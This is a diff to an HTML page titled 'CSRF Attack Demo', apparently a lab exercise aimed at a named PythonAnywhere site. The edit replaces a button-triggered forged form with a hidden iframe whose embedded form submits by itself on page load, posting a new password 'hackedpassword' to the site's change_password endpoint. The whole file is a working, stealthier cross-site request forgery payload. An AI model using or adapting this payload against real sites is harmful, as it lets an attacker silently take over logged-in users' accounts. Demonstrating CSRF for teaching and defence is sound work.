@@ -1,21 +1,13 @@
 <html>
 <body>
     <h1>CSRF Attack Demo</h1>
-    <p>Instructions: Ensure a user is logged into chandraditya.pythonanywhere.com in this browser. Click the button to change their password.</p>
-    <button onclick="triggerCSRF()">Change Password</button>
-    <script>
-        function triggerCSRF() {
-            var form = document.createElement('form');
-            form.method = 'POST';
-            form.action = 'http://chandraditya.pythonanywhere.com/change_password';
-            var input = document.createElement('input');
-            input.type = 'hidden';
-            input.name = 'new_password';
-            input.value = 'hackedpassword';
-            form.appendChild(input);
-            document.body.appendChild(form);
-            form.submit();
-        }
-    </script>
+    <p>This page simulates a malicious site. If you're logged into chandraditya.pythonanywhere.com, your password will change automatically!</p>
+    <!-- Hidden iframe to trigger the CSRF request -->
+    <iframe style="display:none" src="data:text/html;charset=utf-8,
+        <form id='csrfForm' method='POST' action='http://chandraditya.pythonanywhere.com/change_password'>
+            <input type='hidden' name='new_password' value='hackedpassword'>
+            <script>document.getElementById('csrfForm').submit();<\/script>
+        </form>">
+    </iframe>
 </body>
 </html>
